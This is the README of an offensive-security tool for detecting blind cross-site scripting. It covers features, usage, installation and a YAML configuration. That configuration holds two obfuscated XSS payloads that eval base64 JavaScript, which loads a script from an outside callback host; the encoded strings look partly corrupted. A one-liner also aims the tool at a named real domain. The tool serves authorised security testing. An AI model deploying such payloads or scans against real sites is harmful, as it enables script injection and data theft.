# Bxss Sniper

Bxss Sniper is a web application penetration testing tool designed for Blind Cross-Site Scripting (BXSS) detection. This ethical hacking tool empowers security professionals and developers to identify and analyze potential BXSS vulnerabilities in web applications.

### Features

- **Blind XSS Detection:** Bxss Sniper specializes in detecting and testing for Blind Cross-Site Scripting vulnerabilities in web applications.

- **Flexible Testing Options:** Test a single URL or multiple URLs using a file containing a list of targets.

- **Silent Mode:** Enable silent mode to print only the output without displaying the banner and version information.

- **Output Customization:** Specify an output file to save the results for further analysis.

- **Proxy Support:** Switching proxies allows you to send requests through your configured proxy, such as Burp Suite.

- **Timeout Configuration:** Customize the timeout duration for requests, useful for both regular testing and integration with tools like Burp Suite.

- **Concurrency Control:** Adjust the concurrency level for multiple processes, enhancing the efficiency of the testing process.

- **Support Oneliners:** Bxss Sniper supports oneliners to improve your reconnaissance

### Oneliners:

Bxx Sniper supports integration with subdominator which can be easy to detect for blid cross site scripting.

```bash
subdominator -d glia.com -o results.txt --config | bxsniper --silent --concurrency 20 -o bxss.txt
```
![Screenshot from 2023-12-02 17-14-34](https://github.com/sanjai-AK47/Bxss_Sniper/assets/119435129/cbb8797f-7cb9-4e2d-aa6b-ba7d1db18748)



### Command Line Usage
```bash
usage: bxsniper [-h] [-uf URLS_FILE] [-u URL] [-s] [-o OUTPUT] [-px PROXY] [-to TIME_OUT] [-c CONCURRENCY]

[DESCRIPTION]: Bxss Sniper: A web application penetration testing tool for Blind XSS detection

options:
  -h, --help            show this help message and exit
  -uf URLS_FILE, --urls-file URLS_FILE
                        [INFO]: A file that contains a list of URLs to test for blind cross-site scripting
  -u URL, --url URL     [INFO]: A single URL to test for blind cross-site scripting
  -s, --silent          [INFO]: Silently print only output and not print the banner and version
  -o OUTPUT, --output OUTPUT
                        [INFO]: Filename to write the output
  -px PROXY, --proxy PROXY
                        [INFO]: Switching proxy will send requests to your configured proxy (e.g., Burp Suite)
  -to TIME_OUT, --time-out TIME_OUT
                        [INFO]: Switching timeout will send requests till your timeout and also for Burp Suite
  -c CONCURRENCY, --concurrency CONCURRENCY
                        [INFO]: Concurrency level for multiple processes
```


### Installation:

#### Method 1:

```bash
pip install bxss-sniper

bxsniper --help
```
[INFO]: After Installing the Bxss Sniper tool through pip copy the configuration yaml file from the github if you don't have in your machine.

#### Method 2:

```bash
git clone https://github.com/sanjai-AK47/Bxss_Sniper.git

cd Bxss_Sniper

pip install .

bxsniper --help
```

### Configuration:

To detect and do automation with Bxss Sniper users need to configure your `bxss-config.yaml` which you can store your Bxss payloads and Detects for Blind Cross Site Scripting
follow the instruction and syntax to config you `bxss-config.yaml`

```yaml
BlindXSS-Payloads:  #Max Payload 5-7

  - '"><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3Jgic2NyaXB0Iik7YS5zcmM9Imh0dHBzOi8vamVycnkuYnhzm9keS5hcHBlbmRDaGlsZChhKTs&#61;&#61 onerror=eval(atob(this.id))>'
  - "'><img src=x id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7YS57ZG9jdW1lbnQuYm9keS5hcHBlbmRDaGlsZChhKTs&#61;&#61 onerror=eval(atob(this.id))>"
```

[Note]: If your payload have different quotes users are suggessted to give payloads without any yaml syntax errors
        to check your yaml syntax you can check [here](https://yamlchecker.com/) by pasting your payload in that it will notify the errors for you

### Contributors:

- **[D.Sanjai Kumar](https://www.linkedin.com/in/d-sanjai-kumar-109a7227b/):**  Author and Developer of Bxss Sniper
- **[Jerry](https://www.linkedin.com/in/md-hasan-03596a1b5/):**  Source Provider of Bxss Sniper
- **[AslamX3R](https://www.linkedin.com/in/aslamx3r/):**  Source Provider of Bxss Sniper

### Information:

Bxss Sniper is made for web application pentesters and Ethical hackers for Ethical purpose only . The Developer and the Source providers are not responsible for 
any unethical actions.

### Support:

Bxss Sniper is an open-source project that thrives on community collaboration. Contribute by:

- **Code:** Submit pull requests for bug fixes, features, or documentation enhancements.

- **Issues:** Report bugs, vulnerabilities, or suggest improvements.

- **Spread the Word:** Share Bxss Sniper with your network.

### How to Support:

- **Star the Repo:** Show your support on GitHub.

- **Share:** Spread the word on social media and in your communities.

- **Financially:** Help cover hosting and maintenance costs with a financial contribution.

Your contributions and support are vital to Bxss Sniper's success. Thank you for being part of our community! 🌟

